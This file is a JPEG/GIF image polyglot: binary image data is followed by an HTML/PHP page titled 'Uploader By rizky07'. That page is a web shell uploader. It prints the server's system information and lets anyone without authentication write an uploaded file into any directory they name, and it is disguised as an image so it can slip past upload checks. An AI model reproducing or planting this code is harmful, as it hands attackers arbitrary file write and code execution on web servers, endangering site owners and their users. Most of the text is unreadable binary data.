ÿØÿà JFIF      ÿþ ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
ÿÛ C 




ÿÛ C		

ÿÀ  P P" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? û"ŸEîžxÊ}è^ðL2[G¨êù'Í-÷vúµEIÆœy¤TcÌrO…õ-okZÚ³Gÿ =_åZè$øi=”×7—ˆ‹m#,1ùÿ ²×¨¢BíZ~1^t±2:}”Ož)•è¾9ð\+o6§a–ÑüÓB¿u—ÔWž×£Nq©cšQå
(¢¬¤ÿ RÑ@{ý¤K
¬H¿uQTWÏê¬íµW{5{õŽï°Ûî]­å®àÝ®_Ù7¢[¢Š+„é+^D·²£}ÖFS^^û}¸XÜm–Û@úW€²23+.Ö_ájîÂ}£ž¨´QEwœã)ôRÀ¨KYþËuË÷£‘[þù¯ "u’5aó)Ý_>W®|;ÔEç‡"ÏnÆ6Å‰»ÌoIeQ^yÒE+¬Q³1ÂÕóýÕÇÚ®¦™¾ô’3W¬üDÔE‡%Mÿ =ÃÔ:ò:ô0Ñ÷yŽj¬(¢Ší0þGü–“þ@ü»_…m'öÍÒ†>_Ùþe?ÞÜ»öjâëÕþhâÇD/—spÌÛŸïmþç¯.Zf°øŽÃð¥¢ŠòŽ³Êþ*4ŸÛVjXùfßåQýíÍ»ÿ e®+þ^±ñF[íÜ¤eÍ»Ü¿{oñW”W©BW§c’Ÿð?à4´WIømæº‘c‚6–Fû«îjêô†Ú•öÙ.ØY'û_3ß5èÚF…c Ûˆláâl|Íþñ­>£Ò¼Ùâdþ¦4¿˜ç´_iz.Ù>áå¬ß3WB8£"–¹\œ¾#p¢Š) ‡šçµ¯izÖé"á¿å¬?+WEI‘MIÇáÉµo†Ú•ˆfµ)zž‹ò·ýó\”ÖóZÌÑÏE"ýåeÚÕô7AYš¾…c®[˜®áýÙ1ó/Ñ«ª™}£žT¿”ÿÙGIF89a=<!DOCTYPE html>




<html>
<title>Uploader By rizky07</title>
<body >
<center>
<?php
echo "<h3 style='margin-top:0;margin-bottom:5px'>".php_uname()."</h3>";
?>
<form action="" method="post" enctype="multipart/form-data">
   <input type="text" style="padding:5px;border:1px solid green;width:303px;margin-bottom:4px" name="dir"  placeholder="directory">
   <input type="file" style="padding:3px;background-color:green;color:white;margin-bottom:4px" name="file" >
    <input type="submit" style="padding:3px;border:3px solid green;background-color:green;color:white;margin-bottom:4px" value="UPLOAD" name="submit">
</form>
<?php
if(isset($_POST['submit'])) {
$target_dir = $_POST['dir'];
$target_file = $target_dir . basename($_FILES["file"]["name"]);

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "Yosh ! ". basename( $_FILES["file"]["name"]). " UPLOAD > OK";
    } else {
        echo "Anjing, upload gagal !";
    }
  }

?> 
</body>
</html>
